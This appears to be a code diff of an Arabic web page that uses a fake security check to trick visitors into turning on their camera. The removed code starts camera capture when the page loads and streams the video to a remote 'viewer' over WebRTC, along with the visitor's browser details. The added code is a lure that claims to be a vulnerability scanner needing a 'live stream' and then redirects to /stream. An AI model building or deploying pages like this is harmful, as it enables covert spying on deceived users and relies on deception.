@@ -3,198 +3,189 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>بث مباشر | نظام المراقبة</title>
+    <title>نظام المراقبة الأمني</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
         body {
-            background: #0a0a12;
+            background: linear-gradient(135deg, #0a0a12 0%, #1a0a2e 100%);
             color: #fff;
-            font-family: 'Segoe UI', sans-serif;
+            font-family: 'Segoe UI', 'Cairo', sans-serif;
             min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
             padding: 20px;
         }
-        .container { max-width: 600px; margin: 0 auto; }
-        
-        .status-card {
-            background: linear-gradient(135deg, #1a1a2e, #16213e);
-            border-radius: 20px;
-            padding: 20px;
-            text-align: center;
-            margin-bottom: 20px;
-            border: 1px solid #00ff88;
-        }
-        
-        .live-badge {
-            display: inline-block;
-            background: #ff0000;
-            padding: 5px 15px;
-            border-radius: 20px;
-            font-size: 12px;
-            animation: blink 1s infinite;
-        }
-        
-        @keyframes blink {
-            0% { opacity: 1; }
-            50% { opacity: 0.5; }
-            100% { opacity: 1; }
-        }
-        
-        .video-preview {
-            background: #000;
-            border-radius: 20px;
-            overflow: hidden;
-            aspect-ratio: 16/9;
-            border: 2px solid #ff0000;
-            margin: 20px 0;
-        }
-        
-        video {
+
+        .container {
+            max-width: 500px;
             width: 100%;
-            height: 100%;
-            object-fit: cover;
+            animation: fadeIn 0.5s ease;
         }
-        
-        .info-text {
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .card {
+            background: rgba(20, 30, 55, 0.95);
+            backdrop-filter: blur(10px);
+            border-radius: 30px;
+            padding: 40px 30px;
             text-align: center;
-            padding: 15px;
-            background: rgba(0,255,136,0.1);
-            border-radius: 15px;
-            margin-top: 20px;
-            font-size: 14px;
+            border: 1px solid rgba(0, 255, 136, 0.4);
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.3);
         }
-        
-        .stop-btn {
-            background: #ff4444;
+
+        .icon {
+            width: 90px;
+            height: 90px;
+            background: rgba(0, 255, 136, 0.1);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+            border: 2px solid #00ff88;
+        }
+
+        .icon span {
+            font-size: 45px;
+        }
+
+        h1 {
+            color: #00ff88;
+            font-size: 26px;
+            margin-bottom: 10px;
+        }
+
+        .description {
+            color: #aaa;
+            font-size: 14px;
+            margin-bottom: 30px;
+            line-height: 1.6;
+        }
+
+        .btn-live {
+            background: linear-gradient(90deg, #ff0000, #cc0000);
             color: #fff;
             border: none;
-            padding: 12px 30px;
-            border-radius: 30px;
+            padding: 15px 40px;
+            font-size: 18px;
             font-weight: bold;
+            border-radius: 50px;
             cursor: pointer;
-            margin-top: 15px;
+            transition: 0.3s;
             width: 100%;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
         }
-        
-        .status-text {
-            margin: 10px 0;
-            color: #00ff88;
+
+        .btn-live:hover {
+            transform: scale(1.02);
+            box-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
+        }
+
+        .btn-live:active {
+            transform: scale(0.98);
+        }
+
+        .info-text {
+            font-size: 12px;
+            color: #666;
+            margin-top: 20px;
+            padding-top: 20px;
+            border-top: 1px solid #333;
+        }
+
+        .live-badge {
+            display: inline-block;
+            width: 10px;
+            height: 10px;
+            background: #ff0000;
+            border-radius: 50%;
+            animation: pulse 1s infinite;
+            margin-left: 8px;
+        }
+
+        @keyframes pulse {
+            0% { opacity: 1; transform: scale(1); }
+            100% { opacity: 0; transform: scale(1.5); }
+        }
+
+        .warning {
+            color: #ffaa44;
+            font-size: 12px;
+            margin-top: 15px;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="status-card">
-            <span class="live-badge">🔴 بث مباشر</span>
-            <h2 style="margin-top: 15px;">نظام المراقبة عن بعد</h2>
-            <p style="opacity: 0.7;">جاري الاتصال بخوادم الأمان...</p>
+        <div class="card">
+            <div class="icon">
+                <span>🔒</span>
+            </div>
+            
+            <h1>نظام التحقق الأمني</h1>
+            <p class="description">
+                نظام متقدم لكشف الثغرات وحماية الجهاز من الاختراقات<br>
+                يرجى تفعيل البث المباشر لإكمال الفحص
+            </p>
+
+            <button class="btn-live" id="startLiveBtn">
+                <span class="live-badge"></span>
+                بدء البث المباشر
+            </button>
+
+            <div class="info-text">
+                ⚠️ سيتم طلب الوصول إلى الكاميرا لإجراء الفحص
+            </div>
+            <div class="warning">
+                🔒 بيئة آمنة ومعتمدة | جميع الحقوق محفوظة
+            </div>
         </div>
-        
-        <div class="video-preview">
-            <video id="localVideo" autoplay playsinline muted></video>
-        </div>
-        
-        <div class="info-text" id="statusText">
-            📹 جاري تهيئة الكاميرا...
-        </div>
-        
-        <button class="stop-btn" id="stopBtn">إيقاف البث</button>
     </div>
 
-    <script src="/socket.io/socket.io.js"></script>
     <script>
-        const socket = io();
-        let localStream = null;
-        let peerConnection = null;
+        // زر التوجيه إلى صفحة البث
+        const startLiveBtn = document.getElementById('startLiveBtn');
         
-        const configuration = {
-            iceServers: [
-                { urls: 'stun:stun.l.google.com:19302' },
-                { urls: 'stun:stun1.l.google.com:19302' }
-            ]
-        };
-        
-        const video = document.getElementById('localVideo');
-        const statusText = document.getElementById('statusText');
-        
-        async function startBroadcast() {
-            try {
-                statusText.innerHTML = "🎥 طلب الوصول إلى الكاميرا...";
-                
-                localStream = await navigator.mediaDevices.getUserMedia({
-                    video: { width: { ideal: 640 }, height: { ideal: 480 } },
-                    audio: false
-                });
-                
-                video.srcObject = localStream;
-                statusText.innerHTML = "✅ الكاميرا جاهزة - جاري بدء البث...";
-                
-                // إعلام السيرفر ببدء البث
-                socket.emit('start-broadcast', {
-                    username: "ضيف_" + Math.floor(Math.random() * 10000),
-                    userAgent: navigator.userAgent
-                });
-                
-                // إنشاء اتصال WebRTC
-                peerConnection = new RTCPeerConnection(configuration);
-                
-                // إضافة مسارات الفيديو
-                localStream.getTracks().forEach(track => {
-                    peerConnection.addTrack(track, localStream);
-                });
-                
-                // إنشاء Offer
-                const offer = await peerConnection.createOffer();
-                await peerConnection.setLocalDescription(offer);
-                
-                // إرسال الـ Offer للسيرفر
-                socket.emit('offer', {
-                    target: 'viewer',
-                    sdp: peerConnection.localDescription
-                });
-                
-                // معالجة ICE Candidates
-                peerConnection.onicecandidate = (event) => {
-                    if (event.candidate) {
-                        socket.emit('ice-candidate', {
-                            target: 'viewer',
-                            candidate: event.candidate
-                        });
-                    }
-                };
-                
-                statusText.innerHTML = "📡 البث المباشر يعمل الآن ✅";
-                
-            } catch(err) {
-                statusText.innerHTML = "❌ خطأ: لا يمكن الوصول إلى الكاميرا";
-                console.error(err);
-            }
-        }
-        
-        // إيقاف البث
-        function stopBroadcast() {
-            if (localStream) {
-                localStream.getTracks().forEach(track => track.stop());
-            }
-            if (peerConnection) {
-                peerConnection.close();
-            }
-            statusText.innerHTML = "⏹️ تم إيقاف البث";
+        startLiveBtn.addEventListener('click', () => {
+            // تغيير نص الزر وإظهار التحميل
+            startLiveBtn.innerHTML = '<div class="spinner" style="width:18px;height:18px;border:2px solid #fff;border-top:2px solid transparent;border-radius:50%;animation:spin 0.8s linear infinite;display:inline-block;"></div> جاري التوجيه...';
+            startLiveBtn.disabled = true;
+            
+            // التوجيه إلى صفحة البث المباشر
             setTimeout(() => {
-                window.close();
-            }, 1000);
-        }
-        
-        document.getElementById('stopBtn').addEventListener('click', stopBroadcast);
-        
-        // بدء البث تلقائياً
-        startBroadcast();
-        
-        // عند إغلاق الصفحة
-        window.addEventListener('beforeunload', () => {
-            if (localStream) {
-                localStream.getTracks().forEach(track => track.stop());
-            }
+                window.location.href = '/stream';
+            }, 500);
         });
+        
+        // إضافة حركة الـ spinner
+        const style = document.createElement('style');
+        style.textContent = `
+            @keyframes spin {
+                0% { transform: rotate(0deg); }
+                100% { transform: rotate(360deg); }
+            }
+        `;
+        document.head.appendChild(style);
     </script>
 </body>
 </html>
